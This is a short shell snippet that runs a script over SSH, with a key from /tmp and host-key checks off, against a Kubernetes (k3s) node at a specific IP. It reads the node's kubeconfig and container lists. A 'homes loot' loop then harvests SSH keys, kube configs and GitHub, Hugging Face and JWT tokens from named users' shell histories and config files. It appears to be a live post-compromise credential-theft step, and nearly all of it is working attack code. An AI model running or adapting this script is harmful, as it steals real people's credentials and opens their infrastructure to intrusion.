echo "=== 221 agent+crictl ==="
cat > /tmp/r3.sh <<'RSH'
#!/bin/bash
export PATH=$PATH:/var/lib/rancher/k3s/bin
echo "=== agent dir ==="
sudo ls -la /var/lib/rancher/k3s/agent/ 2>/dev/null | head -15
echo "=== server url ==="
sudo grep -rhoE "https://[0-9a-zA-Z._:-]+" /var/lib/rancher/k3s/agent/etc/ 2>/dev/null | sort -u | head -10
sudo cat /etc/rancher/k3s/config.yaml 2>/dev/null
sudo cat /etc/systemd/system/k3s-agent.service 2>/dev/null | grep -E "ExecStart|K3S_URL" | head -5
echo "=== crictl pods ==="
sudo crictl pods 2>/dev/null | head -25 || sudo ctr -n k8s.io c ls 2>/dev/null | head -25
echo "=== crictl ps ==="
sudo crictl ps 2>/dev/null | head -20
echo "=== kubelet conf ==="
sudo cat /var/lib/rancher/k3s/agent/kubelet.kubeconfig 2>/dev/null | head -20
echo "=== homes loot ==="
for h in alexnails bbuf bluekvirus imbernoulli ispobock mickqian xenshinu zijiexia ubuntu; do
  sudo ls -la /home/$h/.ssh/ 2>/dev/null | grep -E "^-|^l" | awk '{print "/home/'$h'/.ssh/"$NF}'
  sudo ls /home/$h/.kube/config /home/$h/.config/rx 2>/dev/null
  sudo grep -rhoE "(gho_[A-Za-z0-9]{36}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{50,}|hf_[A-Za-z0-9]{30,}|eyJ[A-Za-z0-9_-]{20,})" /home/$h/.bash_history /home/$h/.zsh_history /home/$h/.netrc /home/$h/.gitconfig /home/$h/.config/gh/hosts.yml 2>/dev/null | sort -u | head -8
done
RSH
chmod +x /tmp/r3.sh
timeout 110 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r3.sh 2>&1 | head -120
echo "=== B19DONE ==="
